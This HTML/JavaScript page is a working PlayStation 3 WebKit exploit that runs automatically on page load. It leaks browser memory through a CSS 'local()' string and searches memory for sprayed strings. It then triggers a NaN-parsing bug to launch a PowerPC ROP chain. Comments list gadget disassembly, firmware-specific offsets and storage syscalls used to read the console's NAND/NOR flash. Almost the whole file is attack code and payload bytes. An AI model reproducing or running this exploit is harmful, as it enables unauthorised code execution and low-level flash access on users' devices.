<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>
function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,pattern,len)
{
	try
	{
		var search_base = 0x80150000;  //variables used in webkit are created in 0x80150000 to 0x80600000 memory range
		var search_size = 0x450000;
		
		var dat = readMemory(search_base, search_size);
		
		// move past "local("
		dat = dat.substr(6, search_size);
		
		// loop searching for tag
		for (var i = 0; i < (search_size*2); i += 0x8)
		{
			if (dat.charCodeAt(i/2) == pattern)
			{
				var match = 0;
				
				// loop next bytes for comparison
				for (var k = 0; k < len; k+=2)
				{
					// convert to string
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					// increment match
					match += 2;
				}
				
				// we got a complete match
				if (match == len)
				{
					// hold exploit addr
					var exploit_addr = search_base + i + 2;
					
					// display the exploit address
					dbg("Found " + name + " at: " + exploit_addr.toString(16));
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		dbg("The string variable named " + name + " could not be located in the search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadgets,jump_2,jump_1,g,j1,j2;
		var payload;
		var payload_addr=0;		
		var gadgets_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;


		// DEX - libc memcpy 0x006FC0F0
		// DEX - 3 beeps + shutdown 0x000C6730
		// CEX - 3 beeps + shutdown 0x000C5234
		// DEX - 3 beeps 0x0044E8CC (freezes without graceful exit gadgets)
		// CEX - 3 beeps 0x00446CD8 (freezes without graceful exit gadgets)
		
		/*##########################################################################################*/	
		//
		//
		//
		// ROP chain for ros0/1 overwrite operation
		//
		//
		//
		/*##########################################################################################*/
		
		
		<!-- gadget 1 =  unescape("\u7E2F\u0009\u76BC\u7E2F"); 	 -->
																//Gadget 1 sets r1 to the offset of the js string variable 'gadgets' so we control the stack register
																//seg001:0000000000010B30                 mr        r1, r11
																//seg001:0000000000010B34                 blr
		
																//
		<!-- gadget 2 =  unescape("\u7E2F\u0061\u61C8\u7E2F"); -->
																   
																// This gadget will set r3, r4, r5 & r6 required as parameters for memcpy operations
																// It can also set r9, r29, r30 & r31
																// The stw instructions are a minor inconvenience because r3 to r11 don't usually need to be stored
																// r31 should be set before calling this gadget to ensure that register storage takes place in an accessible but unused part of userland RAM.
																<!-- 006161B8 81610074 lwz        r11,0x74(r1) -->
																<!-- 006161BC 81410078 lwz        r10,0x78(r1)                   PIPE -->
																<!-- 006161C0 8101007C lwz        r8,0x7C(r1) -->
																<!-- 006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE -->
																
																// Gadget 2 currently starts here
																<!-- 006161C8 80C10084 lwz        r6,0x84(r1) -->
																<!-- 006161CC 80A10088 lwz        r5,0x88(r1)
																<!-- 006161D0 8081008C lwz        r4,0x8C(r1) -->
																<!-- 006161D4 80610090 lwz        r3,0x90(r1)                    PIPE -->
																<!-- 006161D8 81210094 lwz        r9,0x94(r1) -->
																<!-- 006161DC 80010070 lwz        r0,0x70(r1)                    PIPE -->
																<!-- 006161E0 913F0024 stw        r9,0x24(r31) -->
																<!-- 006161E4 901F0000 stw        r0,0x0(r31)                    PIPE -->
																<!-- 006161E8 917F0004 stw        r11,0x4(r31) -->
																<!-- 006161EC 915F0008 stw        r10,0x8(r31)                   PIPE -->
																<!-- 006161F0 911F000C stw        r8,0xC(r31) -->
																<!-- 006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE -->
																<!-- 006161F8 90DF0014 stw        r6,0x14(r31) -->
																<!-- 006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE -->
																<!-- 00616200 909F001C stw        r4,0x1C(r31) -->
																<!-- 00616204 907F0020 stw        r3,0x20(r31)                   PIPE -->
																<!-- 00616208 E80100D0 ld         r0,0xD0(r1) -->
																<!-- 0061620C 7FA307B4 extsw      r3,r29 -->
																<!-- 00616210 EBC100B0 ld         r30,0xB0(r1) -->
																<!-- 00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE -->
																<!-- 00616218 7C0803A6 mtspr      lr,r0 -->
																<!-- 0061621C EBE100B8 ld         r31,0xB8(r1) -->
																<!-- 00616220 382100C0 addi       r1,r1,0xC0 -->
																<!-- 00616224 4E800020 blr -->
		<!-- gadget 3 =  unescape("\u7E2F\u000C\uE344\u7E2F"); -->
																// Gadget 3 sys_storage_open syscall   
																<!-- 000CE344          li        r11, 0x258 -->
																<!-- 000CE348          mflr      r0 -->
																<!-- 000CE34C          std       r0, 0x10(r1) -->
																<!-- 000CE350          sc -->
																<!-- 000CE354          ld        r0, 0x10(r1) -->
																<!-- 000CE358          extsw     r3, r3 -->
																<!-- 000CE35C          mtlr      r0 -->
																<!-- 000CE360          blr -->
																
		<!-- gadget 4 =  unescape("\u7E2F\u0061\u61BC\u7E2F"); -->
																// Gadget 4
																//to setup 5 out of 7 parameters r4-r8 & r10
																// + r9 & r31 for next gadget
																<!-- 006161BC 81410078 lwz        r10,0x78(r1)                   PIPE -->
																<!-- 006161C0 8101007C lwz        r8,0x7C(r1) -->
																<!-- 006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE -->
																<!-- 006161C8 80C10084 lwz        r6,0x84(r1) -->
																<!-- 006161CC 80A10088 lwz        r5,0x88(r1)
																<!-- 006161D0 8081008C lwz        r4,0x8C(r1) -->
																<!-- 006161D4 80610090 lwz        r3,0x90(r1)                    PIPE -->
																<!-- 006161D8 81210094 lwz        r9,0x94(r1) -->
																<!-- 006161DC 80010070 lwz        r0,0x70(r1)                    PIPE -->
																<!-- 006161E0 913F0024 stw        r9,0x24(r31) -->
																<!-- 006161E4 901F0000 stw        r0,0x0(r31)                    PIPE -->
																<!-- 006161E8 917F0004 stw        r11,0x4(r31) -->
																<!-- 006161EC 915F0008 stw        r10,0x8(r31)                   PIPE -->
																<!-- 006161F0 911F000C stw        r8,0xC(r31) -->
																<!-- 006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE -->
																<!-- 006161F8 90DF0014 stw        r6,0x14(r31) -->
																<!-- 006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE -->
																<!-- 00616200 909F001C stw        r4,0x1C(r31) -->
																<!-- 00616204 907F0020 stw        r3,0x20(r31)                   PIPE -->
																<!-- 00616208 E80100D0 ld         r0,0xD0(r1) -->
																<!-- 0061620C 7FA307B4 extsw      r3,r29 -->
																<!-- 00616210 EBC100B0 ld         r30,0xB0(r1) -->
																<!-- 00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE -->
																<!-- 00616218 7C0803A6 mtspr      lr,r0 -->
																<!-- 0061621C EBE100B8 ld         r31,0xB8(r1) -->
																<!-- 00616220 382100C0 addi       r1,r1,0xC0 -->
																<!-- 00616224 4E800020 blr -->
																
<!-- gadget 5 =  unescape("\u7E2F\u0049\uC358\u7E2F"); -->
																// Gadget 5
																// to setup r3 with value of 'fd'
																<!-- 0049C354				  ld        r3, 0x18(r31)	 -->															<!-- 0049C354                 ld        r3, 0x18(r31) -->
																<!-- 0049C358                 lwz       r9, dword_74B2F0@l(r9) -->
																<!-- 0049C35C                 lwz       r0, 0(r9) -->
																<!-- 0049C360                 std       r2, 0xB0+var_88(r1) -->
																<!-- 0049C364                 mtctr     r0 -->
																<!-- 0049C368                 lwz       r2, 4(r9) -->
																<!-- 0049C36C                 bctrl -->
																
<!-- gadget 6 =  unescape("\u7E2F\u0061\u61D8\u7E2F"); -->
																// Gadget 6
																// to setup r9
																<!-- 006161D8 81210094 lwz        r9,0x94(r1) -->
																<!-- 006161DC 80010070 lwz        r0,0x70(r1)                    PIPE -->
																<!-- 006161E0 913F0024 stw        r9,0x24(r31) -->
																<!-- 006161E4 901F0000 stw        r0,0x0(r31)                    PIPE -->
																<!-- 006161E8 917F0004 stw        r11,0x4(r31) -->
																<!-- 006161EC 915F0008 stw        r10,0x8(r31)                   PIPE -->
																<!-- 006161F0 911F000C stw        r8,0xC(r31) -->
																<!-- 006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE -->
																<!-- 006161F8 90DF0014 stw        r6,0x14(r31) -->
																<!-- 006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE -->
																<!-- 00616200 909F001C stw        r4,0x1C(r31) -->
																<!-- 00616204 907F0020 stw        r3,0x20(r31)                   PIPE -->
																<!-- 00616208 E80100D0 ld         r0,0xD0(r1) -->
																<!-- 0061620C 7FA307B4 extsw      r3,r29 -->
																<!-- 00616210 EBC100B0 ld         r30,0xB0(r1) -->
																<!-- 00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE -->
																<!-- 00616218 7C0803A6 mtspr      lr,r0 -->
																<!-- 0061621C EBE100B8 ld         r31,0xB8(r1) -->
																<!-- 00616220 382100C0 addi       r1,r1,0xC0 -->
																<!-- 00616224 4E800020 blr -->
																
<!-- gadget 7 =  unescape("\u7E2F\u000C\uE364\u7E2F"); -->
																// Gadget 7 sys_storage_read syscall  
																
																<!-- 000CE364                 li        r11, 0x25A -->
																<!-- 000CE368                 mflr      r0 -->
																<!-- 000CE36C                 std       r0, arg_10(r1) -->
																<!-- 000CE370                 sc -->
																<!-- 000CE374                 ld        r0, arg_10(r1) -->
																<!-- 000CE378                 extsw     r3, r3 -->
																<!-- 000CE37C                 mtlr      r0 -->
																<!-- 000CE380                 blr -->	
					










					//Unused gadgets
																
<!-- 004E5020                 ld        r3, 0x38(r9) -->
<!-- 004E5024                 ld        r0, 0x80+arg_10(r1) -->
<!-- 004E5028                 ld        r31, 0x80+var_8(r1) -->
<!-- 004E502C                 addi      r1, r1, 0x80 -->
<!-- 004E5030                 mtlr      r0 -->
<!-- 004E5034                 blr -->

<!-- 00098350                 ld        r0, 0x2C0+arg_10(r1) -->
<!-- 00098354                 addi      r1, r1, 0x2C0 -->
<!-- 00098358                 mtlr      r0 -->
<!-- 0009835C                 ld        r3, 0x98(r9) -->
<!-- 00098360                 blr -->
																
																
<!-- 00019BEC                 mr        r3, r29 -->
<!-- 00019BF0                 ld        r30, 0x90+var_10(r1) -->
<!-- 00019BF4                 ld        r29, 0x90+var_18(r1) -->
<!-- 00019BF8                 mtlr      r0 -->
<!-- 00019BFC                 ld        r31, 0x90+var_8(r1) -->
<!-- 00019C00                 addi      r1, r1, 0x90 -->
<!-- 00019C04                 blr -->
																
																
																

																
																
																
																//
																//
																// Opcodes to search for gadgets offsets in RAM
																
																//DEX
																// Gadget 1
																	//at 0x976BC you should find 7D615B784E800020
																// Gadget 2
																	//at 0x6161C0  you should find 80A100888081008C80610090
																// Gadget 3
																	//at 0x0CE344 you should find 396002587C0802A6F801001044000002
																//CEX
																// Gadget 1
																	//at 0x97604 you should find 7D615B784E800020
																// Gadget 2
																	//at 0x568C88  you should find 80A100888081008C80610090
																// Gadget 3
																	//at 0x0C94E4 you should find 396002587C0802A6F801001044000002

		
		
		
		/* DEX VSH sys_storage sc gadgets
		0x00000000000ce344 : opcode 39600258
		int sys_storage_open(uint64_t id, int mode, int *fd, int flags) mode=0,flags=0, id= NAND  0x100000000000001/NOR  0x100000000000004 
		0x000000000024FADC : opcode 39600259
		int sys_storage_close(int fd)
		0x00000000000CE364 : opcode 3960025A
		int sys_storage_read(int fd, int mode?, uint32_t start_sector, uint32_t sectors, uint8_t *bounce_buf, uint32_t *sectors_read, uint64_t flags) mode?=0
		0x00000000000CE384 : opcode 3960025B
		int sys_storage_write(...)
		*/
		
		/* CEX VSH sys_storage sc gadgets
		0x00000000000C94E4 : opcode 39600258
		int sys_storage_open(uint64_t id, int mode, int *fd, int flags) mode=0,flags=0, id= NAND  0x100000000000001/NOR  0x100000000000004 
		0x000000000024826C : opcode 39600259
		int sys_storage_close(int fd)
		0x00000000000C9504 : opcode 3960025A
		int sys_storage_read(int fd, int mode?, uint32_t start_sector, uint32_t sectors, uint8_t *bounce_buf, uint32_t *sectors_read, uint64_t flags) mode?=0
		0x00000000000C9524 : opcode 3960025B
		int sys_storage_write(...)
		*/


		
		
		dbg("Processing.. Searching memory range for payload string offset....");
		do{
		payload =  unescape("\u2F2A\u3860\u1004\u3880\u000A\u38A0\u01B6\u3960\u0188\u4400\u0002\u4E80\u0020\u2F2A"); // 28 total bytes
		payload_addr = findExploit("payload",payload,0x2F2A,0xE);
		}
		while(payload_addr==0);
		// DEX
		// \u4141 is used for general padding
		// \u4x4x is used as placeholder for runtime replacement by js replaceAt calls
		// Other values like \u2424\u2424\u2424\u2424 means that this 8 byte value will eventually be loaded into r24 by one of the gadgets
		gadgets =  unescape("\u4444\u0009\u76BC\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0202\u0202\u0202\u0202\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u3030\u3030\u3030\u3030\u3131\u3131\u01F1\u3131\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000"); // 164 total bytes after placeholder & 24 bytes after 0xA0 r1 jump
		gadgets =  gadgets+unescape("\u01C6\u324C\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1414\u1414\u1414\u1414\u1515\u1515\u1515\u1515\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1818\u1818\u1818\u1818\u1919\u1919\u1919\u1919\u2020\u2020\u2020\u2020\u2121\u2121\u2121\u2121\u2222\u2222\u2222\u2222\u2323\u2323");//200 bytes
		gadgets =  gadgets+unescape("\u2323\u2323\u2424\u2424\u2424\u2424\u2525\u2525\u2525\u2525\u2626\u2626\u2626\u2626\u2727\u2727\u2727\u2727\u2828\u2828\u2828\u2828\u0000\u0000\u0001\u0000\u3030\u3030\u3030\u3030\u0000\u0000\u8060\u0000\u01F2\u4141\u4141\u4141\u1212\u1212\u4141\u4141\u0000\u0000\u0061\u61CC\u4141\u4141\u4141\u4141");//100 bytes (32 bytes after r1 2nd jump) 
		gadgets =  gadgets+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0001\u4660\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u1000\u0404\u0404\u0001\u0000\u0909\u0909\u4141"); //122 bytes
		gadgets =  gadgets+unescape("\u01F3\u4141\u4141\u4141\u4141\u4141\u4141\u2929\u2929\u2929\u2929\u3030\u3030\u3030\u3030\u4141\u4141\u4141\u4141\u01F4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u4660\u4141\4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");//92 bytes
		gadgets =  gadgets+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7E2A");//200 bytes
		
		// cex
		<!-- gadget =  unescape("\u4444\u0009\u7604\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0202\u0202\u0202\u0202\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u3030\u3030\u3030\u3030\u3131\u3131\u01F1\u3131\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000"); // 164 total bytes after placeholder & 24 bytes after 0xA0 r1 jump -->
		<!-- gadget =  gadget+unescape("\u01c5\u324C\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1414\u1414\u1414\u1414\u1515\u1515\u1515\u1515\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1818\u1818\u1818\u1818\u1919\u1919\u1919\u1919\u2020\u2020\u2020\u2020\u2121\u2121\u2121\u2121\u2222\u2222\u2222\u2222\u2323\u2323");//200 bytes -->
		<!-- gadget =  gadget+unescape("\u2323\u2323\u2424\u2424\u2424\u2424\u2525\u2525\u2525\u2525\u2626\u2626\u2626\u2626\u2727\u2727\u2727\u2727\u2828\u2828\u2828\u2828\u0000\u0000\u0001\u0000\u3030\u3030\u3030\u3030\u0000\u0000\u8060\u0000\u01F2\u4141\u4141\u4141\u1212\u1212\u4141\u4141\u0000\u0000\u0056\u8C94\u4141\u4141\u4141\u4141");//100 bytes & 32 bytes after r1 2nd jump -->
		<!-- gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0001\u4660\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u1000\u0404\u0404\u0001\u0000\u0909\u0909\u4141"); //122 bytes -->
		<!-- gadget =  gadget+unescape("\u01F3\u4141\u4141\u4141\u4141\u4141\u4141\u2929\u2929\u2929\u2929\u3030\u3030\u3030\u3030\u4141\u4141\u4141\u4141\u01F4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u4660\u4141\4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");//92 bytes -->
		<!-- gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7E2A");//200 bytes -->

		gadgets = gadgets.replaceAt(0x23E/2, hexh2bin((payload_addr) >> 16));
		gadgets = gadgets.replaceAt(0x240/2, hexh2bin(payload_addr));
		dbg("Processing.. Searching memory range for gadgets string offset....");
		do{
		g = gadgets.replaceAt(0x00/2,hexh2bin(0x7E2A));
		gadgets_addr = findExploit("gadgets",g,0x7E2A,0x1B8);
		}
		while(gadgets_addr==0);
		
		dbg("Processing.. Searching memory range for jump_2 string offset....");
		jump_2 = unescape("\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4444\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u2A2F"); // 72 bytes
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadgets_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadgets_addr));	
		do{
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x2A2F));
		jump_2_addr = findExploit("j2",j2,0x2A2F,0x24);
		}
		while(jump_2_addr==0);
		
		dbg("Processing.. Searching memory range for jump_1 string offset....");
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F"); // 8 bytes
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));	
		do{

		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		dbg("All string offsets have been found....");
		dbg("Summary:");
		dbg("payload: "+a2hex(payload));
		dbg("payload variable offset: "+payload_addr.toString(16));
		dbg("gadget: "+a2hex(g));
		dbg("gadget variable offset: "+gadgets_addr.toString(16));
		dbg("gadget: "+a2hex(j2));
		dbg("jump_2 variable offset: "+jump_2_addr.toString(16));
		dbg("gadget: "+a2hex(j1));
		dbg("jump_1 variable offset: "+jump_1_addr.toString(16));	
		dbg("Triggering exploit....");
		dbg("PS3 Webkit Exploit by bguerville(ROP & PPC/Javascript), Willerson Stockler(PPC/Javascript), esc0rted3w (Research, testing & debugging)...");
		trigger(jump_1_addr);		
		return;
	} catch(e) {
		dbg(e);
	}
}
</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears without further log below, the exploit failed! Refresh the browser...<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
